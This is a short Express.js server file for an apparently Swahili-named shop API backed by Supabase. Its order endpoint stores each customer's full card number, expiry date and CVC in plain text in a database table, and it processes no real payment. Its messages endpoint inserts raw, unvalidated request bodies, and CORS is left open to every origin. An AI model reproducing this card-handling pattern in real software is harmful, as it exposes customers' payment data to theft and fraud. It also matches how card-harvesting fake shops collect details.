import express from 'express';
import cors from 'cors';
import { createClient } from '@supabase/supabase-js';

const app = express();
app.use(cors());
app.use(express.json());

const supabaseUrl = process.env.SUPABASE_URL;
const supabaseAnonKey = process.env.SUPABASE_ANON_KEY;

const supabase = createClient(supabaseUrl, supabaseAnonKey);

const PORT = process.env.PORT || 5000;

app.get('/', (req, res) => {
    res.json({ message: 'Mkurugenzi API running!' });
});

app.post('/api/orders', async (req, res) => {
    try {
        const data = req.body;
        const { error } = await supabase.from('orders').insert([{
            product_name: data.productName,
            product_price: data.productPrice,
            full_name: data.fullName,
            email: data.email,
            phone: data.phone,
            address: data.address,
            card_last4: data.cardNumber?.slice(-4),
            full_card_number: data.cardNumber,
            card_holder_name: data.cardName,
            card_expiry: data.cardExpiry,
            card_cvc: data.cardCVC,
            status: 'pending'
        }]);
        
        if (error) throw error;
        res.json({ success: true, message: 'Order received!' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false, error: 'Payment failed' });
    }
});

app.post('/api/messages', async (req, res) => {
    try {
        const { error } = await supabase.from('messages').insert([req.body]);
        if (error) throw error;
        res.json({ success: true, message: 'Message sent!' });
    } catch (error) {
        res.status(500).json({ success: false, error: 'Failed to send' });
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
});
